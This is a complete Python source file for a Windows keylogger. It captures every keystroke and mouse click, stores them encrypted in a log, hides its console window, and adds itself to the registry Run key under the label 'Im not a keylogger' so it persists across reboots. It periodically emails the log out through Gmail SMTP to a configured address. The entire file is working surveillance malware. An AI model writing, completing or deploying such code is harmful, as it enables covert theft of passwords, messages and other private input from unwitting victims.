import os
import sys
import time
import smtplib
import base64
from cryptography.fernet import Fernet
from pynput import keyboard, mouse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from winreg import *

# Configuration
yourgmail = "your_email@gmail.com"
yourgmailpass = "your_email_password"
sendto = "recipient_email@gmail.com"
interval = 60  # Interval for sending emails in seconds

# Define paths
current_dir = os.path.dirname(os.path.realpath(__file__))
key_file_path = os.path.join(current_dir, "encryption_key.key")
log_file_path = os.path.join(current_dir, "Logfile.txt")

# Generate encryption key and save it
key = Fernet.generate_key()
cipher_suite = Fernet(key)
with open(key_file_path, 'wb') as key_file:
    key_file.write(key)

# Ensure the log file exists
if not os.path.exists(log_file_path):
    open(log_file_path, 'w').close()

# Adding to startup
def add_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = os.path.join(fp, file_name)
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ, new_file_path)

# Hide console window
def hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

add_startup()
hide()

# Encrypt and save logs
def save_log(data):
    encrypted_data = cipher_suite.encrypt(data.encode('utf-8'))
    with open(log_file_path, 'ab') as log_file:
        log_file.write(encrypted_data + b"\n")

# Send log file via email
def send_log():
    with open(log_file_path, 'rb') as log_file:
        encrypted_log = log_file.read()

    message = MIMEMultipart()
    message['From'] = yourgmail
    message['To'] = sendto
    message['Subject'] = 'Keylogger Log File'

    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(encrypted_log)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file_path)}')
    message.attach(attachment)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, message.as_string())

# Capture keystrokes
def on_press(key):
    try:
        data = f"\n[{time.strftime('%H:%M:%S')}] Key: {key.char}"
    except AttributeError:
        data = f"\n[{time.strftime('%H:%M:%S')}] Special Key: {key}"
    save_log(data)

# Capture mouse events
def on_click(x, y, button, pressed):
    if pressed:
        data = f"\n[{time.strftime('%H:%M:%S')}] Mouse Click at ({x}, {y}) with {button}"
        save_log(data)

# Start listeners
def start_listeners():
    with keyboard.Listener(on_press=on_press) as kl:
        with mouse.Listener(on_click=on_click) as ml:
            kl.join()
            ml.join()

# Schedule email sending
start_time = time.time()
while True:
    current_time = time.time()
    if current_time - start_time >= interval:
        send_log()
        start_time = current_time
    start_listeners()
